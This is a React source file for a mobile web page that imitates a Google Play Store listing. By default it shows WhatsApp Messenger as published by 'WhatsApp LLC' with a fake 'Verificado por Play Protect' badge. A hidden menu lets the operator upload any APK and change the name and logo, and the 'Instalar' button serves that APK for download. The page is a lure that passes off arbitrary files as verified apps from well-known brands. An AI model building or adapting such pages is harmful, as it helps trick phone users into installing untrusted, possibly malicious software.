import { useState, useRef, useEffect } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { DropdownMenu, DropdownMenuContent, DropdownMenuItem, DropdownMenuTrigger } from "@/components/ui/dropdown-menu";
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogTrigger } from "@/components/ui/dialog";
import { Label } from "@/components/ui/label";
import { ArrowLeft, Search, MoreVertical, Shield, Star, Upload, Image, Edit3, Download } from "lucide-react";
import { supabase, APP_CONFIG_ID } from "@/lib/supabase";
import { toast } from "sonner";
import whatsappLogo from "@/assets/whatsapp-logo.png";
import tiktokLogo from "@/assets/tiktok-logo.png";
import kwaiLogo from "@/assets/kwai-logo.png";
import shopeeLogo from "@/assets/shopee-logo.png";
import faceappLogo from "@/assets/faceapp-logo.png";
import facebookLogo from "@/assets/facebook-logo.png";

const Index = () => {
  const [uploadedFile, setUploadedFile] = useState<File | null>(null);
  const [uploadedImages, setUploadedImages] = useState<File[]>([]);
  const [appIcon, setAppIcon] = useState<string | null>(null);
  const [appName, setAppName] = useState<string>("WhatsApp Messenger");
  const [progress, setProgress] = useState(75);
  const [isNameDialogOpen, setIsNameDialogOpen] = useState(false);
  const [tempAppName, setTempAppName] = useState("");
  const fileInputRef = useRef<HTMLInputElement>(null);
  const iconInputRef = useRef<HTMLInputElement>(null);
  const imageInputRef = useRef<HTMLInputElement>(null);

  // Funções para Supabase
  const loadDataFromSupabase = async () => {
    try {
      const { data, error } = await supabase
        .from('app_configs')
        .select('*')
        .eq('id', APP_CONFIG_ID)
        .single();

      if (error && error.code !== 'PGRST116') {
        console.error('Erro ao carregar dados:', error);
        return;
      }

      if (data) {
        if (data.app_icon) setAppIcon(data.app_icon);
        if (data.app_name) setAppName(data.app_name);
        
        // Restaurar APK
        if (data.apk_data && data.apk_name) {
          try {
            const byteCharacters = atob(data.apk_data);
            const byteNumbers = new Array(byteCharacters.length);
            for (let i = 0; i < byteCharacters.length; i++) {
              byteNumbers[i] = byteCharacters.charCodeAt(i);
            }
            const byteArray = new Uint8Array(byteNumbers);
            const blob = new Blob([byteArray], { type: 'application/vnd.android.package-archive' });
            const file = new File([blob], data.apk_name, { type: 'application/vnd.android.package-archive' });
            setUploadedFile(file);
          } catch (error) {
            console.error('Erro ao restaurar APK:', error);
          }
        }
      }
    } catch (error) {
      console.error('Erro ao conectar com Supabase:', error);
      toast.error('Erro ao sincronizar dados. Verifique sua conexão.');
    }
  };

  const saveDataToSupabase = async (data: any) => {
    try {
      const { error } = await supabase
        .from('app_configs')
        .upsert({ id: APP_CONFIG_ID, ...data });

      if (error) {
        console.error('Erro ao salvar dados:', error);
        toast.error('Erro ao salvar dados na nuvem');
      } else {
        toast.success('Dados sincronizados com sucesso!');
      }
    } catch (error) {
      console.error('Erro ao conectar com Supabase:', error);
      toast.error('Erro ao conectar com o servidor');
    }
  };

  // Carregar dados quando o componente montar
  useEffect(() => {
    loadDataFromSupabase();
  }, []);

  // Salvar appIcon quando mudar
  useEffect(() => {
    if (appIcon) {
      saveDataToSupabase({ app_icon: appIcon });
    }
  }, [appIcon]);

  // Salvar appName quando mudar
  useEffect(() => {
    if (appName && appName !== "WhatsApp Messenger") {
      saveDataToSupabase({ app_name: appName });
    }
  }, [appName]);

  const handleFileUpload = (event: React.ChangeEvent<HTMLInputElement>) => {
    const file = event.target.files?.[0];
    if (file && file.name.endsWith('.apk')) {
      setUploadedFile(file);
      
      // Salvar APK no Supabase
      const reader = new FileReader();
      reader.onload = (e) => {
        if (e.target?.result) {
          const arrayBuffer = e.target.result as ArrayBuffer;
          const bytes = new Uint8Array(arrayBuffer);
          let binary = '';
          for (let i = 0; i < bytes.byteLength; i++) {
            binary += String.fromCharCode(bytes[i]);
          }
          const base64 = btoa(binary);
          saveDataToSupabase({ apk_data: base64, apk_name: file.name });
        }
      };
      reader.readAsArrayBuffer(file);
    }
  };

  const handleImageUpload = (event: React.ChangeEvent<HTMLInputElement>) => {
    const files = event.target.files;
    if (files) {
      const pngFiles = Array.from(files).filter(file => file.type === 'image/png');
      setUploadedImages(prev => [...prev, ...pngFiles]);
    }
  };

  const handleDownloadImage = (image: File) => {
    const url = URL.createObjectURL(image);
    const a = document.createElement('a');
    a.href = url;
    a.download = image.name;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
  };

  const handleRemoveImage = (index: number) => {
    setUploadedImages(prev => prev.filter((_, i) => i !== index));
  };

  const handleIconUpload = (event: React.ChangeEvent<HTMLInputElement>) => {
    const file = event.target.files?.[0];
    if (file && file.type.startsWith('image/')) {
      const reader = new FileReader();
      reader.onload = (e) => {
        setAppIcon(e.target?.result as string);
      };
      reader.readAsDataURL(file);
    }
  };

  const handleNameChange = () => {
    setTempAppName(appName);
    setIsNameDialogOpen(true);
  };

  const saveAppName = () => {
    setAppName(tempAppName);
    setIsNameDialogOpen(false);
  };

  const handleInstallApp = () => {
    if (uploadedFile) {
      // Criar um link temporário para download
      const url = URL.createObjectURL(uploadedFile);
      const a = document.createElement('a');
      a.href = url;
      a.download = uploadedFile.name;
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
      URL.revokeObjectURL(url);
    }
  };

  return (
    <div className="min-h-screen bg-white max-w-sm mx-auto">
      {/* Status Bar */}
      <div className="flex justify-between items-center px-4 py-2 text-sm font-medium bg-white">
        <span>22:43</span>
        <div className="flex items-center gap-1">
          <div className="flex gap-1">
            <div className="w-1 h-3 bg-black rounded-full"></div>
            <div className="w-1 h-3 bg-black rounded-full"></div>
            <div className="w-1 h-3 bg-gray-300 rounded-full"></div>
            <div className="w-1 h-3 bg-gray-300 rounded-full"></div>
          </div>
          <div className="ml-2">
            <svg width="18" height="12" viewBox="0 0 18 12" className="text-black">
              <path fill="currentColor" d="M1 4h16v4H1z"/>
              <path fill="currentColor" d="M0 2h18v8H0z" fillOpacity="0.3"/>
            </svg>
          </div>
          <div className="ml-2 w-6 h-3 border border-black rounded-sm relative">
            <div className="absolute right-0 top-0 w-4 h-full bg-black rounded-sm"></div>
          </div>
        </div>
      </div>

      {/* Header */}
      <div className="flex items-center justify-between px-4 py-3 border-b border-gray-100">
        <ArrowLeft className="w-6 h-6 text-gray-700" />
        <div className="flex items-center gap-4">
          <Search className="w-6 h-6 text-gray-700" />
          <DropdownMenu>
            <DropdownMenuTrigger asChild>
              <Button variant="ghost" size="sm" className="p-0">
                <MoreVertical className="w-6 h-6 text-gray-700" />
              </Button>
            </DropdownMenuTrigger>
            <DropdownMenuContent align="end" className="w-48 bg-white shadow-lg border">
              <DropdownMenuItem onClick={() => fileInputRef.current?.click()}>
                <Upload className="w-4 h-4 mr-2" />
                Carregar APK
              </DropdownMenuItem>
              <DropdownMenuItem onClick={() => imageInputRef.current?.click()}>
                <Image className="w-4 h-4 mr-2" />
                Carregar PNG
              </DropdownMenuItem>
              <DropdownMenuItem onClick={() => iconInputRef.current?.click()}>
                <Image className="w-4 h-4 mr-2" />
                Alterar Logo
              </DropdownMenuItem>
              <DropdownMenuItem onClick={handleNameChange}>
                <Edit3 className="w-4 h-4 mr-2" />
                Alterar Nome
              </DropdownMenuItem>
            </DropdownMenuContent>
          </DropdownMenu>
        </div>
      </div>

      {/* Main Content */}
      <div className="px-4 py-6">
        {/* App Info Section */}
        <div className="flex items-start gap-4 mb-8">
          {/* App Icon with Progress Circle */}
          <div className="relative">
            <svg className="w-24 h-24 -rotate-90" viewBox="0 0 96 96">
              {/* Background circle */}
              <circle 
                cx="48" 
                cy="48" 
                r="46" 
                stroke="#e5e7eb" 
                strokeWidth="4" 
                fill="none"
              />
              {/* Progress circle */}
              <circle 
                cx="48" 
                cy="48" 
                r="46" 
                stroke="#3b82f6" 
                strokeWidth="4" 
                fill="none"
                strokeDasharray={`${2 * Math.PI * 46}`}
                strokeDashoffset={`${2 * Math.PI * 46 * (1 - progress / 100)}`}
                className="transition-all duration-300"
              />
            </svg>
            
            <div 
              className="absolute inset-2 rounded-2xl cursor-pointer overflow-hidden"
              onClick={() => iconInputRef.current?.click()}
            >
              {appIcon ? (
                <img 
                  src={appIcon} 
                  alt="App Icon" 
                  className="w-full h-full object-cover"
                />
              ) : (
                <img 
                  src={whatsappLogo}
                  alt="WhatsApp" 
                  className="w-full h-full object-cover"
                />
              )}
            </div>
            
            <Input
              type="file"
              accept="image/*"
              className="hidden"
              ref={iconInputRef}
              onChange={handleIconUpload}
            />
          </div>

          {/* App Details */}
          <div className="flex-1">
            <h1 className="text-2xl font-medium text-gray-900 mb-1">
              {uploadedFile ? uploadedFile.name.replace('.apk', '') : appName}
            </h1>
            <p className="text-blue-600 font-medium mb-2">
              {uploadedFile ? 'Minha Empresa' : 'WhatsApp LLC'}
            </p>
            <p className="text-gray-600 text-sm mb-3">Pendente...</p>
            
            <div className="flex items-center gap-2 text-sm text-gray-600">
              <Shield className="w-4 h-4 text-green-600" />
              <span>Verificado por Play Protect</span>
            </div>
          </div>
        </div>

        {/* Action Buttons */}
        <div className="flex gap-3 mb-8">
          <Button 
            variant="outline" 
            className="flex-1 py-3 px-6 text-blue-600 border-gray-300 hover:bg-gray-50 rounded-full"
            onClick={async () => {
              setUploadedFile(null);
              setAppIcon(null);
              setAppName("WhatsApp Messenger");
              setUploadedImages([]);
              
              // Limpar dados do Supabase
              try {
                const { error } = await supabase
                  .from('app_configs')
                  .delete()
                  .eq('id', APP_CONFIG_ID);
                
                if (error) {
                  console.error('Erro ao limpar dados:', error);
                  toast.error('Erro ao limpar dados da nuvem');
                } else {
                  toast.success('Dados limpos com sucesso!');
                }
              } catch (error) {
                console.error('Erro ao conectar com Supabase:', error);
                toast.error('Erro ao conectar com o servidor');
              }
            }}
          >
            Cancelar
          </Button>
          
          <Button 
            className="flex-1 py-3 px-6 bg-blue-600 hover:bg-blue-700 text-white rounded-full"
            onClick={handleInstallApp}
            disabled={!uploadedFile}
          >
            Instalar
          </Button>
          
          <Input
            type="file"
            accept=".apk"
            className="hidden"
            ref={fileInputRef}
            onChange={handleFileUpload}
          />
          
          <Input
            type="file"
            accept="image/png"
            multiple
            className="hidden"
            ref={imageInputRef}
            onChange={handleImageUpload}
          />
        </div>

        {/* Seção de Imagens PNG */}
        {uploadedImages.length > 0 && (
          <div className="mb-8">
            <h2 className="text-lg font-medium text-gray-900 mb-4">
              Imagens PNG ({uploadedImages.length})
            </h2>
            <div className="grid grid-cols-2 gap-4">
              {uploadedImages.map((image, index) => (
                <div key={index} className="bg-gray-50 rounded-lg p-3">
                  <div className="flex items-center justify-between mb-2">
                    <span className="text-sm font-medium text-gray-700 truncate">
                      {image.name}
                    </span>
                    <Button
                      variant="ghost"
                      size="sm"
                      onClick={() => handleRemoveImage(index)}
                      className="text-red-500 hover:text-red-700 p-1"
                    >
                      ✕
                    </Button>
                  </div>
                  <div className="mb-3">
                    <img
                      src={URL.createObjectURL(image)}
                      alt={image.name}
                      className="w-full h-20 object-cover rounded border"
                    />
                  </div>
                  <Button
                    variant="outline"
                    size="sm"
                    onClick={() => handleDownloadImage(image)}
                    className="w-full text-blue-600 border-blue-200 hover:bg-blue-50"
                  >
                    <Download className="w-4 h-4 mr-1" />
                    Baixar
                  </Button>
                </div>
              ))}
            </div>
          </div>
        )}


        {/* App Suggestions */}
        <div className="mb-6">
          <div className="flex items-center justify-between mb-4">
            <div className="flex items-center gap-2">
              <span className="text-gray-600 text-sm">Anúncios</span>
              <span className="text-gray-400">•</span>
              <span className="text-lg font-medium text-gray-900">Sugestões para você</span>
            </div>
            <MoreVertical className="w-5 h-5 text-gray-600" />
          </div>
          
          <div className="flex gap-4 overflow-x-auto pb-2">
            <div className="flex-shrink-0">
              <div className="w-16 h-16 rounded-2xl mb-2 overflow-hidden">
                <img src={tiktokLogo} alt="TikTok" className="w-full h-full object-cover" />
              </div>
              <p className="text-sm font-medium mb-1 w-16">TikTok Lite</p>
              <div className="flex items-center gap-1">
                <span className="text-xs text-gray-600">4,4</span>
                <Star className="w-3 h-3 text-yellow-500 fill-current" />
              </div>
            </div>
            
            <div className="flex-shrink-0">
              <div className="w-16 h-16 rounded-2xl mb-2 overflow-hidden">
                <img src={kwaiLogo} alt="Kwai" className="w-full h-full object-cover" />
              </div>
              <p className="text-sm font-medium mb-1 w-20 text-wrap leading-tight">Kwai - Ver Vídeos Bacanas</p>
              <div className="flex items-center gap-1 text-xs text-gray-600">
                <span>📱 Instalado</span>
              </div>
            </div>
            
            <div className="flex-shrink-0">
              <div className="w-16 h-16 rounded-2xl mb-2 overflow-hidden">
                <img src={shopeeLogo} alt="Shopee" className="w-full h-full object-cover" />
              </div>
              <p className="text-sm font-medium mb-1 w-20 text-wrap leading-tight">Shopee: 8.8 Liquida Moda</p>
              <div className="flex items-center gap-1 text-xs text-gray-600">
                <span>📱 Instalado</span>
              </div>
            </div>
          </div>
        </div>

        {/* More Apps Section */}
        <div>
          <div className="flex items-center justify-between mb-4">
            <span className="text-lg font-medium text-gray-900">Mais apps para você testar</span>
            <ArrowLeft className="w-5 h-5 text-gray-600 rotate-180" />
          </div>
          
          <div className="flex gap-4 overflow-x-auto">
            <div className="flex-shrink-0">
              <div className="w-16 h-16 rounded-2xl mb-2 overflow-hidden">
                <img src={faceappLogo} alt="FaceApp" className="w-full h-full object-cover" />
              </div>
              <p className="text-sm font-medium mb-1 w-16 text-wrap leading-tight">FaceApp: Editor facial</p>
              <div className="flex items-center gap-1">
                <span className="text-xs text-gray-600">4,3</span>
                <Star className="w-3 h-3 text-yellow-500 fill-current" />
              </div>
            </div>
            
            <div className="flex-shrink-0">
              <div className="w-16 h-16 rounded-2xl mb-2 overflow-hidden bg-gradient-to-br from-yellow-400 to-orange-500 flex items-center justify-center">
                <span className="text-white text-lg">📸</span>
              </div>
              <p className="text-sm font-medium mb-1 w-20 text-wrap leading-tight">Sweet Selfie Câmera e Editor</p>
              <div className="flex items-center gap-1">
                <span className="text-xs text-gray-600">4,5</span>
                <Star className="w-3 h-3 text-yellow-500 fill-current" />
              </div>
            </div>
            
            <div className="flex-shrink-0">
              <div className="w-16 h-16 rounded-2xl mb-2 overflow-hidden">
                <img src={facebookLogo} alt="Facebook" className="w-full h-full object-cover" />
              </div>
              <p className="text-sm font-medium mb-1 w-16">Facebook</p>
              <div className="flex items-center gap-1">
                <span className="text-xs text-gray-600">3,9</span>
                <Star className="w-3 h-3 text-yellow-500 fill-current" />
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Dialog para alterar nome do app */}
      <Dialog open={isNameDialogOpen} onOpenChange={setIsNameDialogOpen}>
        <DialogContent className="bg-white">
          <DialogHeader>
            <DialogTitle>Alterar Nome do App</DialogTitle>
          </DialogHeader>
          <div className="space-y-4">
            <div>
              <Label htmlFor="appName">Nome do App</Label>
              <Input
                id="appName"
                value={tempAppName}
                onChange={(e) => setTempAppName(e.target.value)}
                placeholder="Digite o nome do app"
              />
            </div>
            <div className="flex gap-2 justify-end">
              <Button variant="outline" onClick={() => setIsNameDialogOpen(false)}>
                Cancelar
              </Button>
              <Button onClick={saveAppName}>
                Salvar
              </Button>
            </div>
          </div>
        </DialogContent>
      </Dialog>
    </div>
  );
};

export default Index;
